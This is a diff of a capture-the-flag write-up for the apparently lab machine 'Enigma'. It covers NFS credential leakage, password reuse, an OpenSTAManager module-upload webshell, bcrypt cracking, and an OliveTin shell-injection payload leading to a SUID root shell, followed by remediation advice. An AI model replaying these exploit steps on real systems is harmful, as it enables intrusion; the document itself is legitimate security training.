@@ -1,71 +1,30 @@
-# Enigma — Writeup
+# Enigma — Active Learning Writeup
 
-| Field | Value |
-|-------|-------|
-| **Machine** | Enigma |
+| Target | Detail |
+| :--- | :--- |
 | **OS** | Linux |
-| **Difficulty** | Easy |
-| **Released** | Active (ID 915) |
-| **IP** | 10.129.239.191 (VPN `tun0`) |
+| **Difficulty** | Easy (active, ID 915) |
+| **IP Address** | `10.129.239.191` (VPN `tun0`) |
 | **Owned** | 2026-09-27 — User ✅ Root ✅ |
-| **Time** | ~30 minutes |
+| **Key Concepts** | NFS exposure, password reuse, CVE-2026-38751 (OpenSTAManager RCE), hash cracking, command injection via OliveTin |
+| **Time** | ~30 min |
 
 **Attack path (TL;DR):**
 
 ```text
 nmap → mail (Dovecot) + NFS + nginx vhosts
-     → NFS world-readable share → New_Employee_Access.pdf → kevin mail creds
-     → sarah mailbox (same password) → OpenSTAManager admin creds
-     → OSM v2.9.8 CVE-2026-38751 module upload → www-data RCE
-     → DB creds → haris bcrypt hash → john → "bestfriends" → su → user.txt
-     → OliveTin (root, localhost:1337) → sirf haris allowed (uid firewall)
-     → ConnectRPC API → db_pass command injection → root → root.txt
+     → world-readable NFS share → onboarding PDF → mail credentials
+     → second mailbox via password reuse → OpenSTAManager admin creds
+     → OSM 2.9.8 module-upload RCE (CVE-2026-38751) → www-data
+     → DB creds → bcrypt hash → john → su → user.txt
+     → OliveTin daemon (root) on localhost → API command injection → root
 ```
 
 ---
 
-## 1. The Thought Process (dimaag kaise chala)
+## 1. Reconnaissance & Surface Analysis
 
-Nmap ke baad **4 alag surfaces** mile — ab sochne ka sawaal tha:
-**kahan pehle jaun?**
-
-| Surface | Soch |
-|---------|------|
-| 22 SSH | Password auth band (publickey) — bina creds ke andar nahi |
-| 80 nginx | Vhost redirect (`enigma.htb`) — web apps mein logical errors sabse promising |
-| 110/143 mail | **Creds maangta hai** — creds mile toh inbox = info goldmine |
-| 2049 NFS | File share — **world-readable export dikha (`*`)** = pehle yeh! File system seedha khulta hai, auth nahi chahiye |
-
-**Parallel chalao** — NFS mount + web enum ek saath (doosra banda time
-aapas mein waste karta hai). NFS mein `New_Employee_Access.pdf` mili →
-PDF = HR/IT documents = **credentials ka sabse common dump**.
-
-PDF se kevin creds → Roundcube vhost (`mail001`) mila → par **POP3
-plain auth reject hua** → turant **IMAP SSL (993)** pe switch (same
-creds, secure channel — server plaintext ko mana kar raha tha, MATLAB
-creds valid ho sakte hain!).
-
-kevin ka inbox = welcome mail (kuch nahi). Par **kevin ka password
-sarah pe bhi try kiya** (password reuse ka idea — sabse common weak
-pattern) → **sarah ka inbox khula** → OSM admin creds.
-
-OSM = OpenSTAManager → version note kiya (**2.9.8**) → web pe search:
-"OpenSTAManager2.9 RCE" → **CVE-2026-38751 exact version fit** →
-authenticated module upload RCE. Yahan mushkil "exploit banana" nahi
-tha — **version→CVE match** hi asli skill thi.
-
-www-data ke baad **privesc sochne ka order:**
-1. sudo/SUID/capabilities → nahi mile (standard)
-2. OSM config se DB creds mile → `zz_users` table → **haris ka bcrypt
-   hash** → john (rockyou) → `bestfriends`2 second mein
-3. `su haris` → user flag
-4. Root ke liye recon → **`/usr/local/bin/OliveTin` root process** dikha
-   + config mein **Backup Database action** with `db_pass` interpolation
-   → command injection ka idea seedha mila
-5. Bas **kaise API tak pahunchein** (localhost:1337) — woh debugging
-   tha (Dead Ends section)
-
-## 2. Recon
+### Raw Port Scan
 
 ```bash
 htb machine spawn enigma
@@ -73,224 +32,342 @@ nmap -sC -sV -p- --min-rate 1500 -oA recon 10.129.239.191
 ```
 
 ```text
--p-           : saare65535 ports (fixed list pe bharosa mat karo)
---min-rate 1500 : kam se kam1500 packets/sec — full scan fast khatam ho
--oA recon     : output teen files mein save
+-p-             : scan all 65535 ports (never trust a default list)
+--min-rate 1500 : floor of 1500 packets/sec — finish the full sweep fast
+-sC / -sV       : default scripts + version detection
+-oA recon       : save output in three files
 ```
 
-| Port | Service | Notes |
-|------|---------|-------|
-| 22 | OpenSSH 9.6 | password auth **band** |
-| 80 | nginx | 302 → `enigma.htb` (vhost — hosts file mein daalo!) |
-| 110/143/993/995 | Dovecot | mail (SSL versions bhi hain = creds chal sakte hain) |
-| 2049 + rpc | NFS | `showmount -e` → `/srv/nfs/onboarding *` (sabke liye!) |
+```
+22/tcp    open  ssh     OpenSSH 9.6p1 (password auth disabled)
+80/tcp    open  http    nginx 1.24.0 → 302 to enigma.htb (vhost!)
+110/143   open  pop3/imap  Dovecot (993/995 SSL variants also open)
+2049/tcp  open  nfs     rpcbind + mountd + NFSv4
+```
+
+### Initial Observations
+
+- **Port 22 (SSH):** publickey-only — no password brute even possible.
+- **Port 80 (nginx):** redirect to a hostname → vhost discovery, add it
+  to `/etc/hosts` before anything else.
+- **Ports 110/143 (mail):** requires credentials — *find creds and the
+  inbox becomes an intel goldmine*.
+- **Port 2049 (NFS):** `showmount -e` will tell us if any export is
+  world-readable — file systems are the fastest door when they're open.
+
+### 🧠 Pause & Predict
+
+<details>
+<summary><b>Think first:</b> four surfaces at once — which do you
+probe first, and do you go sequential or parallel?</summary>
+
+Probe NFS and web **in parallel** (they don't depend on each other).
+NFS with a `*` export needs no authentication at all, so it's the
+cheapest possible win; web enumeration runs meanwhile. SSH is a dead
+end until creds exist; mail is a *consumer* of credentials, not a
+source. That ordering logic is why the whole chain started with
+`showmount -e` + a vhost fetch in the same minute.
+</details>
+
+## 2. Enumeration & Finding the Seam
+
+### What I Investigated
 
 ```bash
 echo "10.129.239.191 enigma.htb mail001.enigma.htb support_001.enigma.htb" >> /etc/hosts
 showmount -e 10.129.239.191
+# Export list for 10.129.239.191:
+# /srv/nfs/onboarding *
 ```
 
 ```text
-showmount -e : NFS server se "kaunsi shares kiske liye hain" list maango
--e           : exports list
+showmount -e : ask the NFS server which exports exist and who may mount them
+-e           : print the export list
+*            : ANY client IP may mount — effectively public
 ```
 
-## 3. Dead Ends (kya try kiya, kya fail hua)
+### 🧠 Interactive Challenge
 
-> Is box ka asli time yahin gaya — aur yahi lessons hain:
+<details>
+<summary><b>Challenge:</b> the export list shows
+<code>/srv/nfs/onboarding *</code>. Before reading any file — what
+kind of content do you expect and where does it usually lead?</summary>
 
-1. **NFS mount direct fail:**
-   `mount: Operation not permitted` — humara Docker container
-   `CAP_SYS_ADMIN` ke bina aata hai, mount syscall chahiye hi.
-   → **Fix:** doosra *privileged* container chalao jo humare network
-   namespace (`--network container:kali`) mein mount kar sake. Mounted
-   share ko `docker exec cat` se bahar nikaala.
+An export named "onboarding" almost always holds HR/IT documents:
+welcome PDFs, credential sheets, network diagrams. Expect
+credentials-in-a-document as the intended lead, and open files before
+touching heavier services.
+</details>
 
-2. **POP3 login reject:**
-   `Plaintext authentication disallowed on non-secure connections`
-   → POP3 (110) plain tha, **IMAP SSL (993)** try kiya — chal gaya.
-   *Lesson: auth reject ≠ creds galat. Channel galat ho sakta hai.*
+### ❌ Failure Log — What I Tried First & Why It Failed
 
-3. **`su` pipe se fail:**
-   `echo pass | su - haris -c id` → hamesha `Authentication failure`.
-   Asli wajah: **`su` TTY (terminal) maangta hai**, pipe se password
-   padhta hi nahi.
-   → **Fix:** target pe Python `pty.fork()` — asli terminal jaisa
-   banake password bheja → turant chal gaya.
-   *Ye beginner ka #1 trap hai — error message galat direction deta hai.*
+1. Ran `mount -t nfs ...` **inside the Kali container** → **Result:**
+   `Operation not permitted`.
+   *Takeaway:* containers ship without `CAP_SYS_ADMIN`; mounting is a
+   privileged syscall. Fix: launch a throwaway `--privileged`
+   sidecar sharing our network namespace
+   (`--network container:kali`) and mount there.
+2. Logged into **POP3 (110)** with the PDF credentials → **Result:**
+   `Plaintext authentication disallowed on non-secure connections`.
+   *Takeaway:* auth rejection ≠ wrong password — the *channel* may be
+   the problem. Retry on **IMAP SSL (993)** → login succeeded.
+3. Ran `echo pass | su - haris -c id` → **Result:** always
+   `Authentication failure`.
+   *Takeaway:* `su` reads the password from a TTY, not a pipe. The
+   error message lies. Fix: spawn a real pseudo-terminal
+   (`python3 pty.fork()`) and write the password to it → instant
+   success.
+4. Fed three known passwords to `sudo -S -l` as `www-data` →
+   **Result:** all wrong; `sudo -n -l` confirmed the user isn't in
+   sudoers at all.
+5. From `www-data`, TCP connect to OliveTin on `127.0.0.1:1337` →
+   **Result:** connection timeout even though `ss` showed LISTEN.
+   Probes: `3306 OK / 1337 FAIL` (as www-data) vs `1337 OK` (as
+   haris) → **UID-based OUTPUT firewall**.
+   *Takeaway:* "port is open" is incomplete — *who* may connect is a
+   separate rule. Debug loopback per-uid before declaring a service
+   dead.
+6. Called the OliveTin API with `{"actionId":...}` → **Result:**
+   `action with ID  not found` (empty). Wrong path first
+   (`/olivetin...` → served the SPA's index.html), then wrong field.
+   *Takeaway:* don't guess protobuf JSON — pull the service/method
+   from binary `strings` and the `.proto` from the upstream repo.
+   Fields were `binding_id` + `arguments[{name,value}]`, not
+   `action_id`.
+7. Sent the injection payload inline in a shell `curl -d '...'` →
+   **Result:** quote broke early and the payload executed in *my*
+   local shell instead of against the API.
+   *Takeaway:* when a payload contains quotes/semicolons, base64 the
+   JSON body and decode on the fly — never hand-wrap it in quotes.
 
-4. **sudo password attempts fail** — teeno known passwords galat the,
-   `sudo -n -l` se pata chala haris sudoers mein hai hi nahi.
+### The Breakthrough (Root Cause Breakdown)
 
-5. **`www-data` se OliveTin :1337 timeout:**
-   `ss` mein LISTEN dikh raha tha par TCP connect hi nahi ho raha tha.
-   Lag raha tha service dead hai.
-   → Debug: `3306 OK / 1337 FAIL` (www-data) vs `1337 OK` (**haris**)
-   → **uid-based OUTPUT firewall** tha. *Service ka chalna zaroori
-   nahi — kaun chala sakta hai woh bhi rule hai.*
+**Flaw #1 — World-readable NFS export:** `*` means any client may
+mount; no authentication stands between the network and the files.
 
-6. **OliveTin API ke galat field names** (3 rounds):
-   - Path `/olivetin.api...` → HTML mila (SPA fallback) → asli path
-     **`/api/olivetin.api.v1...`** (probe se mila)
-   - `{"actionId":...}` → "action ID  not found" (empty) → proto
-     padhi: field **`binding_id`** tha, `action_id` nahi!
-   - Ek baar meri payload quoting toot gayi → injection **API ke bajaye
-     local shell mein chal gaya** (SUID ban gaya par root ka nahi)
-   → **Fix:** GitHub se asli `.proto` file padhi + bodies base64 se
-   bheji.
+**Flaw #2 — Password reuse:** the same password worked for two
+different mailboxes, turning one leaked document into two inboxes.
 
-## 4. Vulnerability ELI5
+**Flaw #3 — CVE-2026-38751 (OpenSTAManager ≤ 2.10):** the module
+update feature unpacks an attacker-supplied ZIP into the web root with
+no content validation → arbitrary PHP execution.
 
-**NFS world-readable export:**
+**Flaw #4 — Shell command injection (OliveTin):** the daemon runs
+actions as root by interpolating an attacker-controlled argument into
+a `shell:` string inside single quotes — classic quote-breakout.
 
-> Office ki file cupboard bina lock ke khuli padi hai aur building ka
-> guard (`*` export) kisi ko bhi andar aane deta hai. NFS share mein
-> `*` = koi bhi IP wala banda khole.
+**Real-World Analogies:**
 
-**Password reuse:**
+> *NFS `*`:* an office filing cabinet left unlocked in a lobby that
+> everyone may enter.
+>
+> *Password reuse:* one key cut for your home, bike, and office —
+> losing it once loses all three.
+>
+> *Command injection:* a receptionist who reads your "password" aloud
+> into the boss's shell command — you answer `x'; my-order; #` and she
+> pastes it verbatim; everything after `#` (the rest of the boss's
+> order) becomes a comment.
+>
+> *UID firewall:* a staff-only lift — the customer (www-data) presses
+> and the doors stay shut, but a staff badge (haris) opens them.
 
-> Tumne ghar, bike aur office teeno ke liye ek hi key banwai. Ek jagah
-> khona = teeno jagah gaya. Yahan `Enigma2024!` kevin=sarah=mail mein,
-> OSM alag tha par chain wahi chali.
+<details>
+<summary><b>🧠 Mini-challenge:</b> the vulnerable shell line is
+<code>mysqldump -u USER -p'PASS' DB &gt; out.sql</code> and
+<code>PASS</code> is attacker-controlled. What three-part payload
+runs your own commands then hides the rest?</summary>
 
-**Command Injection (OliveTin `db_pass`):**
+Close the quote → inject commands → comment out the tail:
+<code>x'; id; #</code>. Parsed as: run <code>mysqldump -u USER -p'x'</code>,
+then <code>id</code>, then everything after <code>#</code> is ignored.
+</details>
 
-> Receptionist boss kehti hai: "password bolo, main mysqldump command
-> mein daal ke chalati hoon." Tumne bola:
-> `x'; rm -rf boss; #` — aur usne bina soche apne *poore command*
-> mein chipka diya. `#` ke baad ka poora "boss ka baaki order" kaat
-> gaya — chala **sirf tumhara**.
+## 3. Foothold (Initial Access)
 
-**UID firewall (localhost:1337):**
+### Stage A — NFS → PDF → mail credentials
 
-> Lift sirf staff ke liye hai — customer (www-data) dabao toh door
-> band, office wali (haris) dabao toh khul jaati hai. Port bahar se
-> band nahi tha, **andar jaane wale ki pehchaan** check ho rahi thi.
+```text
+Command structure (privileged sidecar mount):
+docker run -d --rm --network container:kali --privileged --name nfsdump \
+  <image> sleep 7200
+docker exec nfsdump mount -t nfs -o nolock,vers=3,addr=<ip> \
+  <ip>:/srv/nfs/onboarding /mnt/x
+```
 
-**OliveTin = root ka remote control:**
-
-> Office ka woh attendant hai jiske paas **boss ka asli master key**
-> hai (root) aur wo koi bhi predefined button daba ke commands chalata
-> hai. Humne uske button mein apna order chipka diya.
-
-## 5. Exploitation
-
-### NFS → PDF → creds
-
-Container mount cap ke bina — privileged sidecar:
+```text
+--network container:kali : join OUR netns — the target is only reachable via our VPN tun0
+--privileged             : gain CAP_SYS_ADMIN so mount() is allowed
+-o nolock,vers=3         : skip the lock daemon + force NFSv3 (compatibility)
+```
 
 ```bash
-docker run -d --rm --network container:kali --privileged --name nfsdump \
-  kalilinux/kali-rolling sleep 7200
-docker exec nfsdump mount -t nfs -o nolock,vers=3,addr=10.129.239.191 \
-  10.129.239.191:/srv/nfs/onboarding /mnt/x
 docker exec nfsdump cat /mnt/x/New_Employee_Access.pdf > /tmp/
 pdftotext /tmp/New_Employee_Access.pdf -
 ```
 
 ```text
---network container:kali : humare VPN (tun0) wale network mein chal —
-                           target sirf wahan se dikhta hai
--o nolock,vers=3         : lock service chhod do + NFSv3 (compat)
-pdftotext -              : PDF ka text stdout pe (binary mat padho)
+pdftotext <file> - : extract text to stdout (humans read text, not PDF binary)
 ```
 
 ```text
 URL: http://mail001.enigma.htb   Username: kevin   Password: Enigma2024!
 ```
 
-### Mailbox hopping
+### Stage B — Mailbox hopping (password reuse)
 
-POP3 plain reject → IMAP SSL:
+```text
+Syntax structure:
+M = imaplib.IMAP4_SSL(<host>, 993)
+M.login(<user>, <pass>)
+```
+
+<details>
+<summary><b>Task:</b> kevin's mailbox only has a welcome mail. What
+single cheap test can turn this into a second inbox?</summary>
+
+Try kevin's password against the *other* mailbox owner (sarah).
+Password reuse is the most common weak pattern in every org — and here
+it worked immediately.
+</details>
 
 ```python
 M = imaplib.IMAP4_SSL('10.129.239.191', 993)
-M.login('kevin', 'Enigma2024!')   # welcome mail — kuch nahi
-M.login('sarah', 'Enigma2024!')   # reuse try → INBOX mila!
+M.login('kevin', 'Enigma2024!')   # welcome mail only
+M.login('sarah', 'Enigma2024!')   # reuse test → INBOX opened
 ```
 
-Sarah ke inbox mein:
+Sarah's inbox holds the IT reply:
 
 ```text
 OpenSTAManager → http://support_001.enigma.htb
 admin : Ne3s4rtars78s
 ```
 
-### OpenSTAManager → www-data (CVE-2026-38751)
+### Stage C — OpenSTAManager → www-data (CVE-2026-38751)
 
-Version **2.9.8** (CSS `app.min.css?v=2.9.8` se) → CVE search →
-**module update upload = arbitrary PHP**:
+Version fingerprint came from static assets
+(`app.min.css?v=2.9.8`) → public-advisory search → exact-fit CVE.
 
-```python
-#1. login
-s.post(t + '/index.php?op=login', data={'username': 'admin', 'password': 'Ne3s4rtars78s'})
-#2. module updates enable (warna upload endpoint kaam nahi karta)
-s.post(t + '/ajax.php?a=check_module_updates_settings', data={'Attiva aggiornamenti': '1'})
-#3. ZIP = shell/MODULE (definition) + shell/shell.php (webshell)
-#4. upload → /modules/aggiornamenti/upload_modules.php
-#5. RCE
-requests.get(t + '/modules/shell/shell.php', params={'c': 'id'})
-# uid=33(www-data)
+```text
+Request chain (authenticated arbitrary module upload):
+1. POST /index.php?op=login            → session cookie
+2. POST /ajax.php?a=check_module_updates_settings   → enable updates
+3. POST /modules/aggiornamenti/upload_modules.php   → ZIP: shell/MODULE + shell/shell.php
+4. GET  /modules/shell/shell.php?c=id  → RCE
 ```
 
-**Why it worked:** app ne ZIP ke andar ke files par koi extension/content
-check nahi kiya — module install = root of trust, wahan PHP rakh diya.
+**Why it worked:** the module unpacker trusted the ZIP completely —
+it treats an uploaded module as first-party code (root of trust), so
+a `.php` file lands inside the web root and executes.
 
-### www-data → haris (john)
+```text
+uid=33(www-data)
+```
+
+## 4. Privilege Escalation
+
+### Internal Audits (order matters)
 
 ```bash
-cat /var/www/html/openstamanager/config.inc.php
-# $db_username='brollin'; $db_password='Fri3nds@9099';
+sudo -l                                 # (as www-data) → not in sudoers
+find / -perm -4000 -type f 2>/dev/null  # → standard SUID only
+getcap -r / 2>/dev/null                 # → standard capabilities only
+```
 
-mysql -ubrollin -p'Fri3nds@9099' openstamanager -N -e 'SELECT username,password FROM zz_users'
-# haris: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
+Nothing exotic on disk → pivot: **read the app's own configuration**.
 
-echo '$2y$10$WHf1...' > haris.hash
-john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
-# bestfriends  (2 seconds!)
+```bash
+grep -E 'db_username|db_password' /var/www/html/openstamanager/config.inc.php
+# brollin : Fri3nds@9099
+```
+
+```bash
+mysql -ubrollin -p'Fri3nds@9099' openstamanager -N -e \
+  'SELECT username,password FROM zz_users'
+# haris : $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
 ```
 
 ```text
--N : table headers/rubbish hatao — sirf values
---format=bcrypt : hash type force karo ($2y$ = bcrypt) — auto-detect
-                  pehla hi hash often galat category mein jaata hai
+-N : drop column headers — raw values only (script-friendly)
 ```
 
-`su` ko TTY chahiye — Python `pty` trick:
+### The Misconfiguration
 
-```python
-pid, fd = pty.fork()                    # asli terminal banao
-if pid == 0:
-    os.execvp('su', ['su', '-', 'haris', '-c', 'cat /home/haris/user.txt'])
-else:
-    time.sleep(0.8)
-    os.write(fd, b'bestfriends\n')      # password TTY pe bhejo
+- **Hash:** bcrypt (`$2y$10$...`) — algorithm is fine, but the
+  underlying password was dictionary-grade.
+- **Same hash also doubles as the system login** for that user (mail
+  auth proved it via PAM).
+
+### 🧠 Privesc Reasoning
+
+<details>
+<summary><b>Q:</b> why did I reach for <code>john</code> instead of
+writing my own cracker — and why did it finish in 2 seconds?</summary>
+
+bcrypt at cost10 already has mature GPU/CPU crackers; reinventing one
+is waste. It finished in 2 seconds because the password sat near the
+top of `rockyou.txt` — hashing strength is irrelevant against weak
+*password choice*. Lesson: algorithm reviews ≠ password policy.
+</details>
+
+```bash
+echo '$2y$10$WHf1...' > haris.hash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
+# bestfriends
 ```
+
+```text
+--format=bcrypt : force the correct category — auto-detection often
+                  misclassifies $2y$ hashes on the first pass
+```
+
+### TTY requirement for `su`
+
+```text
+Syntax structure:
+python3 -c 'import pty,os,time
+pid,fd=pty.fork()
+if pid==0: os.execvp("su",[...])
+else: time.sleep(0.8); os.write(fd,b"<password>\n")'
+```
+
+<details>
+<summary><b>Task:</b> <code>echo pass | su - user -c id</code> always
+fails with "Authentication failure" though the password is correct.
+Why, and what replaces the pipe?</summary>
+
+<code>su</code> reads from a TTY, never stdin — so a pipe silently
+never delivers the password. Replace it with a pseudo-terminal
+(Python <code>pty.fork()</code>, or <code>script -qec</code>) and
+write the password to the master side.
+</details>
 
 ```
 ff4d8e92f6f456fcec6e70019cbdd97e   ← user flag
 ```
 
-### haris → root (OliveTin API injection)
+### Root — OliveTin API command injection
 
-Recon: `ps aux` → `/usr/local/bin/OliveTin` **root** mein.
-Config `/etc/OliveTin/config.yaml`:
+Recon found `/usr/local/bin/OliveTin` running as **root**; its config
+(`/etc/OliveTin/config.yaml`) contains:
 
 ```yaml
 - title: Backup Database
   id: backup_database
   shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
   arguments:
-    - {name: db_pass, type: password}   # FREE TEXT — single quotes ke andar!
+    - {name: db_pass, type: password}   # free text, interpolated in single quotes
 ```
 
-**Blocker:** :1337 sirf non-root se block (uid firewall) → **haris ke
-session se** call karna hai. OliveTin = **ConnectRPC** (protobuf JSON):
+The API lives on `127.0.0.1:1337` but a UID-based firewall blocks
+`www-data` → the call must originate from **haris's** session.
+OliveTin speaks **ConnectRPC** (protobuf over JSON):
 
-```bash
-# service/method binary ke strings se:
-# /api/olivetin.api.v1.OliveTinApiService/StartAction
-# proto (GitHub se): binding_id + arguments[{name,value}]
+```text
+Service/Method (from binary strings):
+/api/olivetin.api.v1.OliveTinApiService/StartAction
+Fields (from upstream .proto): binding_id + arguments[{name,value}]
 ```
 
 ```bash
@@ -304,30 +381,29 @@ curl -s -X POST \
   http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
 ```
 
-**Why it worked:** OliveTin root mein `shell:` string ko **shell ke
-hawale** karta hai. `db_pass` single-quotes ke andar aata hai — humne
-quote tod ke apne commands chipka diye; `#` ne baaki original command
-ko comment bana diya:
+**Why it worked:** OliveTin executes `shell:` strings through a real
+shell as root. Our `db_pass` lands inside single quotes — we broke
+out, inserted commands, and `#` commented out the remainder:
 
 ```text
-mysqldump -u backup_svc -p'x'; <HUMARA COMMAND>; #' production > ...
-                      └ quote close  └ chal gaya  └ baaki sab gayab
+mysqldump -u backup_svc -p'x'; <our commands>; #' production > ...
+                      └ quote closes  └ executed  └ tail neutralized
 ```
 
 ```bash
 /tmp/.rsh -p -c 'id; cat /root/root.txt'
 # euid=0(root)
-# 7585bea1d4d3f2351354f5f67b5a935b   ← root flag
 ```
 
 ```text
-bash -p : SUID bash mein -p flag = "privileged mode" — warna bash
-          euid ko dhank ke normal user jaisa behave karta hai
+bash -p : "privileged mode" — without it, bash drops the effective
+          root UID back to the real one on startup
 ```
 
-Cleanup: webshell, SUID bash, sidecar container — sab delete.
+Cleanup: webshell, SUID bash, and the sidecar container were all
+removed before submission.
 
-## 6. Flags
+## 5. Flags
 
 ```text
 user: ff4d8e92f6f456fcec6e70019cbdd97e
@@ -338,49 +414,63 @@ root: 7585bea1d4d3f2351354f5f67b5a935b
 htb machine own <flag>
 ```
 
-## 7. Patch / Remediation
+## 6. Defense & Remediation (The Sysadmin View)
 
-- **NFS:** export mein `*` kabhi mat rakho — specific subnet/IP ya
-  kerberos auth; `root_squash` on (root banane se pehle rokta hai).
-  Sensitive files share se bahar.
-- **Mail:** POP3/IMAP plaintext auth disable (done by server — sahi
-  hai); **password per-user unique** → reuse chain toot jaati.
-- **OSM:** version upgrade (>2.10) — module upload ab validate karta;
-  admin creds strong + unique; `config.inc.php` webroot se bahar ya
-  perms 640 (www-data ko DB password dikhna hi nahi chahiye tha).
-- **OliveTin `shell:` injection:** arguments ko **shell-escape** karo
-  (Go mein `shlex.Quote` jaisa) ya `exec:` array form use karo (args
-  alag rehte hain, shell parsing nahi hoti). Password args ko log/API
-  response mein mat echo karo.
-- **API auth:** `authRequireGuestsToLogin: true` + per-action
-  permissions — uid firewall theek tha par app-level auth bhi hona
-  chahiye (defense in depth).
-- **Hashes:** bcrypt hai ✓ (crack hua kyunki password weak tha —
-  complexity policy + password manager yahan bhi laagu karo).
+| Stage | Issue | Secure Fix |
+| :--- | :--- | :--- |
+| File share | NFS export with `*` (any client) | Export to specific subnets/hosts only; enable `root_squash`; move sensitive docs off shares |
+| Mail | Password reused across mailboxes; POP3 plaintext offered | Unique per-user credentials (password manager); plaintext auth disabled (already on) |
+| Web app | OpenSTAManager 2.9.8 (known RCE ≤ 2.10) | Upgrade past the advisory; restrict `/modules/aggiornamenti/` to trusted IPs |
+| App config | DB password readable inside web root (`config.inc.php`) | Move config outside the document root; `chmod 640`; dedicated low-priv DB user |
+| Automation | OliveTin interpolates args into `shell:` strings run as root | Use `exec:` array form (no shell parsing) or strict shell-quoting of every argument; enable API auth (`authRequireGuestsToLogin: true`) |
+| Host | UID-based loopback firewall without app-layer auth | Keep network rules as defense-in-depth, but authenticate the service itself too |
 
-## Key takeaways
+## 7. Key Takeaways
 
-1. **Auth error ≠ dead end** — POP3 reject ke baad IMAP SSL try kiya;
-   creds sahi the, channel galat tha.
-2. **`su` ka TTY trap** — pipe-fail ko "wrong password" mat samjho;
-   `pty.fork()` ya `script -qec` hi jawab hai.
-3. **Version note karo → CVE search** — OSM2.9.8 = exact-fit vuln,
-   exploit banana nahi padha.
-4. **`strings` + official source** — unknown service ka API guess mat
-   karo: binary strings se method, GitHub se `.proto`.
-5. **Firewall ka sawaal "port open" nahi, "kaun" hai** — `ss` LISTEN
-   dikhata hai, connect kis uid se hoga woh test karo.
+1. **An auth error is a channel error until proven otherwise** — POP3
+   rejection became an IMAP-SSL login.
+2. **`su`'s TTY requirement** is the #1 beginner trap; the error
+   message blames the password instead of the missing terminal.
+3. **Version → CVE first, exploit writing never** — fingerprint the
+   app, then read advisories.
+4. **Never guess an RPC API** — extract methods from `strings`, read
+   the `.proto` upstream; field names will bite you.
+5. **Loopback firewalls filter *by uid*, not just by port** — test
+   connectivity per-user before diagnosing a service as dead.
+6. **Quote-sensitive payloads go through base64**, never inline shell
+   quoting.
 
-## Final Checklist
+## 8. 🧠 Active Recall Challenges (Before You Close This Box)
 
-- [x] Naya banda flags/syntax samajh payega? (har flag toda)
-- [x] Shaq kaise hua — har pehla kadam explain kiya? (web vs nfs order,
-      IMAP switch, version→CVE)
-- [x] Commands ka order = actual terminal order? ✓ (aur jo fail hua
-      woh alag section mein)
+- [ ] **Challenge 1:** the privileged sidecar trick used
+      `--network container:kali`. Without it, name two ways to reach a
+      target that is only routable through someone else's VPN.
+- [ ] **Challenge 2:** reproduce the injection locally: run
+      `sh -c "echo -p'x'; id; #'" ` and explain the parse tree — which
+      tokens reach the binary, which become a comment?
+- [ ] **Challenge 3:** the OliveTin config also offers an `exec:`
+      array form. Rewrite the vulnerable action with `exec:` so the
+      same payload becomes harmless — and explain why.
 
-## Tools used
+<details>
+<summary><b>Answers</b> (attempt first, then open)</summary>
 
-`nmap` · `showmount` · docker privileged sidecar · `pdftotext` ·
-`imaplib` · `mysql` · `john` · python `pty` · `curl` (ConnectRPC) ·
-`htb` CLI
+1. (a) Move the VPN to the host and route/docker-bridge normally;
+   (b) run the VPN client in a sidecar with `--cap-add NET_ADMIN`
+   sharing a user-defined bridge network with your tools container.
+2. The shell tokenizes: command `echo`, argument `-p'x'` (quotes
+   consumed), then `;` starts a new command `id`, then `#` comments
+   out everything after it. Only `echo` and `id` execute.
+3. `exec: ["mysqldump", "-u", "{{db_user}}", "-p{{db_pass}}", ...]`
+   — arguments are passed as a literal argv array to the binary; no
+   shell ever parses them, so `'; id; #` is just a weird password
+   string.
+</details>
+
+---
+
+**Final Checklist (before publishing):**
+- [ ] Could a newcomer parse every command? (flags broken down)
+- [ ] Is the *WHY* of the first move explained? (NFS+web parallel, IMAP switch)
+- [ ] Are failures documented? (7 entries in the Failure Log)
+- [ ] Does command order match what actually ran? ✓
